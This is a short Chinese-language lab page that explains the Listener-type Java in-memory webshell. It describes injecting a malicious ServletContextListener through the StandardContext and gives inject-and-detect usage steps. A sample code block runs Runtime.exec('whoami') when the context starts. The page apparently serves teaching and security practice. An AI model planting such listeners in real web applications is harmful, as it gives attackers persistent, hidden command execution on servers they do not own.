内存马 - Listener型 

  Listener型内存马是一种通过动态注册ServletContextListener到Web容器中实现的内存马。它可以在Web应用启动和关闭时执行恶意代码。
  注入原理：通过获取StandardContext对象，创建并注册恶意Listener，从而实现在应用生命周期事件中执行命令。

漏洞场景
使用说明
1. 配置监听器名称和命令参数
2. 点击"注入内存马"按钮进行注入
3. 重启应用或触发上下文事件时，监听器将执行命令
4. 点击"检测内存马"查看已注入的监听器

示例代码

                            

                                
ServletContextListener evilListener = new ServletContextListener() {
    @Override
    public void contextInitialized(ServletContextEvent sce) {
        try {
            Process process = Runtime.getRuntime().exec("whoami");
            // 处理命令输出...
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {
        // 在Web应用关闭时执行
    }
};
